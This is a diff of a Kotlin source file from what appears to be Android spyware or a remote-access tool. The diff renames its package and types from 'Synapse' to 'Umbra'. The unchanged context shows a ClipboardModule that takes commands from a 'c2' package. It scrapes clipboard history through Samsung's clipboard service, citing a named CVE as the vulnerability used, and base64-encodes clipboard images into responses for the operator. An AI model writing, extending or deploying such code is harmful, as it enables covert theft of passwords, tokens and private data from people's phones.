@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.ClipData
 import android.content.ClipboardManager
@@ -10,9 +10,9 @@ import android.os.IBinder
 import android.os.Parcel
 import android.util.Base64
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.ClipboardEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.ClipboardEntry
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import kotlinx.serialization.encodeToString
@@ -22,10 +22,10 @@ import java.lang.reflect.Method
 
 object ClipboardModule {
 
-    private const val TAG = "Synapse.Clipboard"
+    private const val TAG = "Umbra.Clipboard"
     private val json = Json { prettyPrint = false }
 
-    suspend fun scrape(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun scrape(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val action = cmd.params["action"] ?: "all"
         val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50
 
@@ -41,7 +41,7 @@ object ClipboardModule {
                 else -> scrapeHistoryEntries(context, count)
             }
 
-            SynapseResponse.ClipboardResponse(
+            UmbraResponse.ClipboardResponse(
                 provider_type = "Samsung SemClipboardService",
                 vulnerability = "SVE-2026-0916 (CVE-2026-21062)",
                 entry_count = entries.size,
@@ -49,7 +49,7 @@ object ClipboardModule {
             )
         } catch (e: Exception) {
             Log.e(TAG, "Clipboard scrape failed: ${e.message}", e)
-            SynapseResponse.ErrorResponse(error = "clipboard:${e.message}", module = "clipboard")
+            UmbraResponse.ErrorResponse(error = "clipboard:${e.message}", module = "clipboard")
         }
     }
 
@@ -205,9 +205,9 @@ object ClipboardModule {
         return map
     }
 
-    suspend fun readImage(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun readImage(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val uriStr = cmd.params["uri"]
-            ?: return@withContext SynapseResponse.ErrorResponse(error = "missing_uri", module = "clipboard")
+            ?: return@withContext UmbraResponse.ErrorResponse(error = "missing_uri", module = "clipboard")
         try {
             val uri = Uri.parse(uriStr)
             val input = context.contentResolver.openInputStream(uri)
@@ -218,18 +218,18 @@ object ClipboardModule {
             } ?: ByteArray(0)
             if (bytes.isNotEmpty()) {
                 val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                SynapseResponse.FileReadResponse(
+                UmbraResponse.FileReadResponse(
                     file_id = uriStr,
                     mime_type = "image/*",
                     size_bytes = bytes.size.toLong(),
                     base64_data = b64
                 )
             } else {
-                SynapseResponse.ErrorResponse(error = "empty_content", module = "clipboard")
+                UmbraResponse.ErrorResponse(error = "empty_content", module = "clipboard")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Image read failed: ${e.message}")
-            SynapseResponse.ErrorResponse(error = "clipboard_image:${e.message}", module = "clipboard")
+            UmbraResponse.ErrorResponse(error = "clipboard_image:${e.message}", module = "clipboard")
         }
     }
 }
